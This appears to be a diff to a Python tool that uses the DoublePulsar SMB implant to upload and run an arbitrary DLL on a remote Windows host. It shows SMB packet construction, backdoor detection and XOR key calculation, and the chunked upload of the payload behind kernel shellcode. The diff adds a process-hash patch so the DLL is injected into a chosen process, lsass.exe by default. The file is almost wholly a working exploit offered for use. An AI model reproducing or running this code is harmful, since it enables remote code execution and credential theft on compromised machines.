@@ -4,6 +4,7 @@ import binascii
 import socket
 import struct
 
+
 def calculate_doublepulsar_xor_key(s):
     x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
     x = x & 0xffffffff  # this line was added just to truncate to 32 bits
@@ -27,6 +28,26 @@ def read_dll_file_as_hex():
         print("file imported into memory!")
         print('File size: {:d}'.format(len(data)))
     return data
+
+def calc_hash(name: str) -> int:
+    esi = 0          # index into string (simulates esi pointer)
+    eax = 0          # hash accumulator
+
+    while True:
+        edi = eax
+        edi = (edi << 7) & 0xFFFFFFFF   # shl edi, 7
+        edi = (edi - eax) & 0xFFFFFFFF  # sub edi, eax  →  edi = eax * 127
+        eax = edi
+
+        ecx = 0
+        if esi >= len(name):            # mov cl, [esi] / cmp cl, 0 / jz done
+            break
+        ecx = ord(name[esi])            # mov cl, [esi]
+
+        eax = (eax + ecx) & 0xFFFFFFFF # add eax, ecx
+        esi += 1                        # inc esi
+
+    return eax
 
 def hexdump(src, length=16, sep='.'):
     """Hex dump bytes to ASCII string, padded neatly
@@ -75,7 +96,8 @@ def int2le(integer, pad):
         return '\x00'
     return ''.join(buf)
 
-#converted with chatgpt
+
+# converted with chatgpt
 def int_to_le(data: int) -> bytes:
     b = bytearray(4)
     b[0] = data & 0xFF
@@ -83,6 +105,8 @@ def int_to_le(data: int) -> bytes:
     b[2] = (data >> 16) & 0xFF
     b[3] = (data >> 24) & 0xFF
     return bytes(b)
+
+
 '''
 # Test the function
 data = 0x12345678
@@ -90,6 +114,7 @@ result = int_to_le(data)
 print(result)  # Output: b'xV4\x12'
 print("Bytes: ", " ".join(f"{byte:02X}" for byte in result))
 '''
+
 
 def byte_xor(data, key):
     key_bytes = key.to_bytes(4, byteorder='little')
@@ -333,10 +358,35 @@ rundll_kernel_shellcode += b"\xF3\xAA\x58\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5E\x5
 
 if __name__ == "__main__":
     # Packets
-    negotiate_protocol_request = binascii.unhexlify("00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
-    session_setup_request = binascii.unhexlify("00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
-    tree_connect_request = binascii.unhexlify("00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
-    trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+    negotiate_protocol_request = binascii.unhexlify(
+        "00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200")
+    session_setup_request = binascii.unhexlify(
+        "00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000")
+    tree_connect_request = binascii.unhexlify(
+        "00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00")
+    trans2_session_setup = binascii.unhexlify(
+        "0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+
+    bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
+    print("Please enter a process.  lsass.exe is the default process, press continue to skip")
+    process_entry = input("Enter process name to inject the DLL into:  ").strip()
+    if process_entry:  # user typed something
+        process_name = process_entry.lower()
+        process_hash = calc_hash(process_name)
+        process_hash_little_endian = struct.pack('<I', process_hash)
+        offset_process_hash = 2146
+        # process hash
+        bytearray_rundll_kernel_shellcode[offset_process_hash: offset_process_hash + 4] = process_hash_little_endian
+
+        print(f"  {process_entry:<20} -> 0x{calc_hash(process_entry):08X}\n")
+        process_hash_chunk = b''.join([bytearray_rundll_kernel_shellcode[offset_process_hash: offset_process_hash + 4]])
+        print("[RunDLL shellcode] hexdump of process hash in shellcode:  ")
+        print(hexdump(process_hash_chunk))
+
+    else:
+        # user pressed Enter, skip function
+        print("No process entered, continuing...")
+        #print(f"  {process_entry:<20} -> 0x{calc_hash(process_entry):08X}\n")
 
     timeout = 5.0
     # sample IP
@@ -401,15 +451,15 @@ if __name__ == "__main__":
 
         print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
 
-        #byte_xor_key = struct.pack('<I', key)
-        #print(hexdump(byte_xor_key))
-        #bytes_xor_key = int2le(byte_xor_key, 0)
-        #print(hexdump(bytes_xor_key))
+        # byte_xor_key = struct.pack('<I', key)
+        # print(hexdump(byte_xor_key))
+        # bytes_xor_key = int2le(byte_xor_key, 0)
+        # print(hexdump(bytes_xor_key))
 
-        #int_bytes_xor_key = int(key)
-        #bytes_xor_key = int2le(int_bytes_xor_key, 0)
-        #print(hexdump(bytes_xor_key))
-        #b_bytes_xor_key = bytes(bytes_xor_key.encode())
+        # int_bytes_xor_key = int(key)
+        # bytes_xor_key = int2le(int_bytes_xor_key, 0)
+        # print(hexdump(bytes_xor_key))
+        # b_bytes_xor_key = bytes(bytes_xor_key.encode())
 
         hex_bytes = read_dll_file_as_hex()
         # Commented out for debug purposes
@@ -417,7 +467,7 @@ if __name__ == "__main__":
         # print(hexdump(byte_xor_key))
         print('File size: {:d}'.format(len(hex_bytes)))
 
-        bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
+        #bytearray_rundll_kernel_shellcode = bytearray(rundll_kernel_shellcode)
         bytearray_hex_bytes = bytearray(hex_bytes)
 
         # EntireDLLSize = len(hex_bytes)
@@ -425,22 +475,27 @@ if __name__ == "__main__":
         # EntirePayloadSize = len(hex_bytes) + 6144
         EntirePayloadSize = len(bytearray_hex_bytes) + 6144
 
-        #for debug purposes
-        #EntirePayloadSize = 0x50D800FF
-        #EntirePayloadSize = 6144 + len(hex_bytes)
+        # for debug purposes
+        # EntirePayloadSize = 0x50D800FF
+        # EntirePayloadSize = 6144 + len(hex_bytes)
 
         offset_kernel_shellcode = 2158
         offset_dll_size = 6136
         offset_dll_ordinal = 6140
+        #offset_process_hash = 2146
 
         total_size_of_dll_and_user_shellcode = struct.pack('<I', EntireDLLSize + 3978)
         total_size_dll = struct.pack('<I', EntireDLLSize)
         ordinal = 1
         dll_ordinal = struct.pack('<I', ordinal)
-        bytearray_rundll_kernel_shellcode[offset_kernel_shellcode: offset_kernel_shellcode + 4] = total_size_of_dll_and_user_shellcode
+        bytearray_rundll_kernel_shellcode[
+        offset_kernel_shellcode: offset_kernel_shellcode + 4] = total_size_of_dll_and_user_shellcode
         bytearray_rundll_kernel_shellcode[offset_dll_size: offset_dll_size + 4] = total_size_dll
         bytearray_rundll_kernel_shellcode[offset_dll_ordinal: offset_dll_ordinal + 4] = dll_ordinal
-        #print(hexdump(bytearray_rundll_kernel_shellcode))
+        #process_hash_little_endian = struct.pack('<I', process_hash)
+        #bytearray_rundll_kernel_shellcode[offset_process_hash: offset_process_hash + 4] = process_hash_little_endian
+
+        # print(hexdump(bytearray_rundll_kernel_shellcode))
 
         TotalPayload = bytearray()
         TotalPayload += bytearray_rundll_kernel_shellcode
@@ -462,7 +517,8 @@ if __name__ == "__main__":
             print("we have a remainder of:  %d bytes" % remainder)
 
         times = int(iterations)
-        trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
+        trans2_exec_packet = binascii.unhexlify(
+            "0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
 
         for i in range(times):
             doublepulsar_exec_packet = bytearray(trans2_exec_packet)
@@ -479,7 +535,8 @@ if __name__ == "__main__":
             '''
             EntireSize = struct.pack('<I', EntirePayloadSize)  # entire value of the payload being uploaded
             ChunkSize = struct.pack('<I', 4096)  # using the same value since chunk size is less than 4096
-            PayloadOffset = struct.pack('<I', Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+            PayloadOffset = struct.pack('<I',
+                                        Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
 
             parameters = b''
             parameters += EntireSize
@@ -509,7 +566,8 @@ if __name__ == "__main__":
 
         if remainder > 0:
             print("LAST PACKET!")
-            last_trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
+            last_trans2_exec_packet = binascii.unhexlify(
+                "0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
             last_doublepulsar_exec_packet = bytearray(last_trans2_exec_packet)
 
             remainder_packet_len = 70 + remainder + 12 - 4
@@ -530,15 +588,17 @@ if __name__ == "__main__":
 
             # last_payload_chunk = hex_bytes[Offset:remainder]
             # print(hexdump(last_payload_chunk))
-            remainder_bytes = b''.join([xor_bytes[Offset: Offset + remainder]])  # for i in range(0, len(hex_bytes), remainder)])
+            remainder_bytes = b''.join(
+                [xor_bytes[Offset: Offset + remainder]])  # for i in range(0, len(hex_bytes), remainder)])
             print("Length of last remainder bytes:  %d" % len(remainder_bytes))
 
             # remainder_bytes[i * 4096: (i + 1) * 4096] = file.read(4096)
 
-            last_parameters = b'' #bytearray()
+            last_parameters = b''  # bytearray()
             LastEntireSize = struct.pack('<I', EntirePayloadSize)  # entire value of the payload being uploaded
             LastChunkSize = struct.pack('<I', remainder)  # using the same value since chunk size is less than 4096
-            LastOffset = struct.pack('<I', Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
+            LastOffset = struct.pack('<I',
+                                     Offset)  # No need to increment offset since this is 1 packet and not multiple.  Increment by ChunkSize per iteration
             last_parameters += LastEntireSize
             last_parameters += LastChunkSize
             last_parameters += LastOffset
@@ -562,31 +622,33 @@ if __name__ == "__main__":
             last_doublepulsar_exec_packet[32] = user_id[0]
             last_doublepulsar_exec_packet[33] = user_id[1]
 
-            #last_doublepulsar_exec_packet += last_parameters_bytearray
+            # last_doublepulsar_exec_packet += last_parameters_bytearray
             last_doublepulsar_exec_packet += last_xor_parameters
             last_doublepulsar_exec_packet += remainder_bytes
 
             s.send(last_doublepulsar_exec_packet)
             smb_response = s.recv(1024)
-		
-	    if smb_response[9] == 0x02 and smb_response[10] == 0x00 and smb_response[11] == 0x00 and smb_response[12] == 0xc0:
-		    print("DoublePulsar returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!")
+
+            if smb_response[9] == 0x02 and smb_response[10] == 0x00 and smb_response[11] == 0x00 and smb_response[
+                12] == 0xc0:
+                print("DoublePulsar returned: 0xC0000002 - STATUS_NOT_IMPLEMENTED!")
 
             if smb_response[34] == 82:
-	            print("Doublepulsar returned:  Success!\n")
-                #0x62
+                print("Doublepulsar returned:  Success!\n")
+            # 0x62
             elif smb_response[34] == 98:
-	            print("Doublepulsar returned:  Invalid parameters!\n")
-                #0x72
+                print("Doublepulsar returned:  Invalid parameters!\n")
+            # 0x72
             elif smb_response[34] == 114:
-	            print("Doublepulsar returned:  Allocation failure!\n")
+                print("Doublepulsar returned:  Allocation failure!\n")
             else:
-	            print("Doublepulsar didn't succeed\n")
+                print("Doublepulsar didn't succeed\n")
 
             BytesLeft -= remainder
             print("Bytes left ->", BytesLeft)
 
-        tree_disconnect = binascii.unhexlify("00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
+        tree_disconnect = binascii.unhexlify(
+            "00000023ff534d4271000000001807c00000000000000000000000000008fffe00084100000000")
         tree_disconnect_packet = bytearray(tree_disconnect)
         tree_disconnect_packet[28] = tree_id[0]
         tree_disconnect_packet[29] = tree_id[1]
@@ -595,7 +657,8 @@ if __name__ == "__main__":
         s.send(tree_disconnect_packet)
         smb_response = s.recv(1024)
 
-        logoff = binascii.unhexlify("00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000")
+        logoff = binascii.unhexlify(
+            "00000027ff534d4274000000001807c00000000000000000000000000008fffe0008410002ff0027000000")
         logoff_packet = bytearray(logoff)
         logoff_packet[28] = tree_id[0]
         logoff_packet[29] = tree_id[1]
